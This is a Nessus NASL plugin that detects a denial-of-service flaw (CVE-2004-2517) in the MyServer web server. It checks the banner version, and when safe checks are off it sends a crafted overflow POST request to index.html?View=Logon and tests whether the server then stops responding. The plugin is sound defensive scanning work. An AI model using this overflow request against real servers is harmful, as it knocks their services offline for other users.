#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security
#
#  Ref: badpack3t <badpack3t@security-protocols.com> for .:sp research labs:.
#
#  This script is released under the GNU GPL v2
#

# Changes by Tenable:
# - Revised plugin title (4/20/009)


include("compat.inc");

if(description)
{
 script_id(14838);
 script_version ("$Revision: 1.8 $");

 script_cve_id("CVE-2004-2517");
 script_xref(name:"OSVDB", value:"10333");
 script_xref(name:"Secunia", value:"12640");

 script_name(english: "MyServer HTTP POST Request Remote Overflow DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is susceptible to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running MyServer, an open-source web server.  The
installed version is vulnerable to remote denial of service attack. 
Using a specially crafted HTTP POST request to 'index.html' when
'View' is set to 'Logon', an unauthenticated remote attacker can cause
the server to stop responding." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?913eb7d4" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/project/shownotes.php?release_id=270736" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the MyServer version 0.7.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english: "Test POST DoS on MyServer");
 
 script_category(ACT_MIXED_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english: "Web Servers");
 
 script_dependencie("http_version.nasl", "www_too_long_url.nasl");
 script_exclude_keys("www/too_long_url_crash");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 banner = get_http_banner(port:port);
 if(!banner) exit(0);
 if ( "MyServer" >!< banner ) exit(0);

 if (safe_checks())
 {
 	#Server: MyServer 0.7.1
 	if(egrep(pattern:"^Server: *MyServer 0\.([0-6]\.|7\.[0-1])[^0-9]", string:banner))
        {
          security_warning(port);
        }
   exit(0);
 }
 else
 {
   if(http_is_dead(port:port))exit(0);
   data = http_post(item:string("index.html?View=Logon HTTP/1.1\r\n", crap(520), ": ihack.ms\r\n\r\n"), port:port); 
   soc = http_open_socket(port);
   if(soc > 0)
   {
    send(socket:soc, data:data);
    http_close_socket(soc);
    sleep(1);
    soc2 = http_open_socket(port);
    if(!soc2)
    {
	security_warning(port);
    }
    else http_close_socket(soc2);
   }
 }
}
